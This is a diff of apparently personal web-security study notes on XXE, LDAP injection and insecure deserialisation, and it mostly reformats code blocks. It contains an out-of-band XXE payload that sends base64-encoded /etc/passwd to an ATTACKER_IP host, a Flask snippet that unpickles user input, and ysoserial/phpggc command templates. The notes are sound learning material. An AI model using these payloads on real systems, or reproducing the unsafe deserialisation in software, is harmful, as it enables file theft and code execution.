@@ -755,47 +755,47 @@
     
     2. External Entities are similar to internal ones, but their contents are referenced from outside the XML document, such as seperate file or URL. This is the thing we are after to exploit XXE. So, if the XML parser is configured to resolve to external entities, we can use it.
     
-    <!DOCTYPE note [
-    
-    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
-    
-    ]>
-    
-    <note>
-    
-        <info>&ext;</info>
+        <!DOCTYPE note [
         
-    </note>
+        <!ENTITY ext SYSTEM "http://example.com/external.dtd">
+        
+        ]>
+        
+        <note>
+        
+            <info>&ext;</info>
+            
+        </note>
     
-      Here, '&ext;' pulls content from the specified URL which could be dangerous if the URL is controlled by an attacker.
+    Here, '&ext;' pulls content from the specified URL which could be dangerous if the URL is controlled by an attacker.
     
     3. Parameter Entities are special types used within DTDs to define reusable structures or to include external DTD subsets. They are mainly used for maintaining large-scale XML applications.
     
-    <!DOCTYPE note [
-    
-    <!ENTITY % common "CDATA">
-    
-    <!ENTITY name (%common;)>
-    
-    ]>
-    
-    <note>
-    
-        <name>Nischal Khadka</name>
+        <!DOCTYPE note [
         
-    </note>
+        <!ENTITY % common "CDATA">
+        
+        <!ENTITY name (%common;)>
+        
+        ]>
+        
+        <note>
+        
+            <name>Nischal Khadka</name>
+            
+        </note>
     
-      Here, '%common;' is used within the DTD to define the type of data that the 'name' element should have.
+    Here, '%common;' is used within the DTD to define the type of data that the 'name' element should have.
        
     4. General Entities are similar to variables and can be declared either internally or externally. 
     
     5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from being confused reagrding the XML syntax.
     
-        - &lt; for '<'
+        - '&lt;' for '<'
         
-        - &gt; for '>'
+        - '&gt;' for '>'
         
-        - &amp; for '&'
+        - '&amp;' for '&'
         
 ## XML Parsing Mechanisms:
 
@@ -819,11 +819,11 @@
 
 - On the other hand, Out-of-Band, means out-of-hand. That means we cannot see the server's response to the user input. So, we could try to exfiltrate the data by capturing it in our own controlled server. After we host the server, we could use the DDT with an Entity of SYSTEM and a declaration with our attacking servers IP and port that would be called in the XML document as '&xxe;', which would then connect to our machine's IP. If the connection is established successfully, we could extract the information by creating a DTD file which contains an external entity with a PHP filter to exfiltrate data from the target web application.
 
-    <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-    
-    <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
-    
-    %oobxxe;
+        <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+        
+        <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+        
+        %oobxxe;
     
 - This DTD payload begins with an entity of '%cmd' that directly points to a system resource to retrieve contents of '/etc/passwd'. Base64 encoding filter is applied to encode the content in Base64 to avoid formatting problems. The '%oobxxe' entity again has another XML entity declaration 'exfil' that exfiltrates the data to the attacker-controlled server. The paramter '?data=%cmd' sends the Base64-encoded content from '%cmd'. Now, when we go back and change the payload pointing to our machines IP and the file we created, and finally decalring '&exfil;', we would have successfully exfiltrated the contents in our machine. First, the request is made to the file we created to exfiltrate the data, then on the second request the information is diclosed to us. Then, we can use cyberchef or any other tool to decode the Base64-encoded data to gain insights of the information present in '/etc/paswd'.
   
@@ -903,7 +903,7 @@
 
 - LDAP injection exploits the way web application construct LDAP queries. It is similar to SQL injection, where SQL statements are injected into queries to manipulate database operations, but in LDAP injection the malicious code targets the LDAP queries.
 
-- We can exploit a vulnerable LDAP query to inject malicious LDAP filters such as "*". AS, "*" always returns to true in the LDAP directory which is a kind of a wildcard.
+- We can exploit a vulnerable LDAP query to inject malicious LDAP filters such as '*'. AS, '*' always returns to true in the LDAP directory which is a kind of a wildcard.
 
 ## Authentication Bypass Techniques:
 
@@ -989,33 +989,31 @@
 
     - Python uses 'Pickle' to serialise and deserialise objects. This module converts a Python object into a byte stream (and vice versa) which enables it to be saved to a file or transmitted over a network. A representation of how python serialises and deserialises objects is given below:
     
-        import pickle
-        
-        import base64
-
-        ...
-        serialized_data = request.form['serialized_data']
-        
-        notes_obj = pickle.loads(base64.b64decode(serialized_data))
-        
-        message = "Notes successfully unpickled."
-        ...
-
-        elif request.method == 'POST':
-        
-            if 'pickle' in request.form:
+            import pickle
             
-                content = request.form['note_content']
+            import base64
+
+            serialized_data = request.form['serialized_data']
+            
+            notes_obj = pickle.loads(base64.b64decode(serialized_data))
+            
+            message = "Notes successfully unpickled."
+
+            elif request.method == 'POST':
+            
+                if 'pickle' in request.form:
                 
-                notes_obj.add_note(content)
-                
-                pickled_content = pickle.dumps(notes_obj)
-                
-                serialized_data = base64.b64encode(pickled_content).decode('utf-8')
-                
-                binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
-                
-                message = "Notes pickled successfully."
+                    content = request.form['note_content']
+                    
+                    notes_obj.add_note(content)
+                    
+                    pickled_content = pickle.dumps(notes_obj)
+                    
+                    serialized_data = base64.b64encode(pickled_content).decode('utf-8')
+                    
+                    binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
+                    
+                    message = "Notes pickled successfully."
             
     - Here, an object of a class 'Notes' is referred as 'notes_obj'. Basically, the class is used for managing a list of notes in this web application to manage the applications state. So, in the process of serialisation, when a user submits a note, the Notes class instance (including all notes) is serialised using 'pickle.dumps()'. This function transforms the Python object into binary format that Python can later turn back into an object during deserialisation. Then, the serialised data is encoded with Base64 because binary data contain bytes that may interfere with communication protocols like HTTP. Then, when unpickling, the base64 string is first decoded back into binary format using 'base64.b64decode()'. Then, finally the function 'pickle.loads()' reconstructs the original Python object from the binary system.
     
@@ -1053,14 +1051,14 @@
     
     - Payload Customization: We can customize the payload to achieve specific outcomes by specifying arguments for the functions or methods involved in the gadget chain.
     
-        $ php phpggc -l 
+            $ php phpggc -l 
         
     
 - Yoserial for Java:
 
     - It is a widely recognized exploitation tool to test security of JAVA applications against serialisation vulnerbailites. It helps in generating paylaods that exploits these vulnerabilites. 
     
-        $ java -jar ysoserial.jar [payload type] '[command to execute]'
+            $ java -jar ysoserial.jar [payload type] '[command to execute]'
     
 # SSRF
 
